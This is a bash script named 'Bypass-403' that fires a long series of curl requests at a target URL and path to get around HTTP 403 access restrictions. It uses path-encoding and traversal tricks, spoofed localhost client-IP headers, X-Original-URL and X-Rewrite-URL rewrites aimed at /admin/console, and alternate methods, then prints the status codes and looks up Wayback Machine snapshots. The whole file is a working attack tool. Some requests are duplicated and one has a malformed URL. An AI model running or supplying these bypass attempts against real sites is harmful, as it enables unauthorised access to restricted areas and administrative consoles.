#! /bin/bash
figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "./bypass-403.sh https://example.com path"
echo " "
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
#updated
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
echo "Modified ones"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Originating-IP: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Remote-IP: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-ProxyUser-Ip: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-ProxyUser-Ip: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Client-IP: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Client-IP: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "True-Client-IP: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H True-Client-IP: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Cluster-Client-IP: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Cluster-Client-IP: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-ProxyUser-Ip: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-ProxyUser-Ip: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: /admin/console" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: /admin/console"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Rewrite-URL: /admin/console" $1/$2
echo "  --> ${1}/${2} -H X-Rewrite-URL: /admin/console"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%252e/$2
echo "  --> ${1}/%252e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%ef%bc%8f/$2
echo "  --> ${1}/%ef%bc%8f/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/
echo "  --> ${1}/${2}/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/..
echo "  --> ${1}/./${2}/.."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/;/$2"
echo "  --> ${1}/;/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/.;/$2"
echo "  --> ${1}/.;/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1//;//$2"
echo "  --> ${1}//;//${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"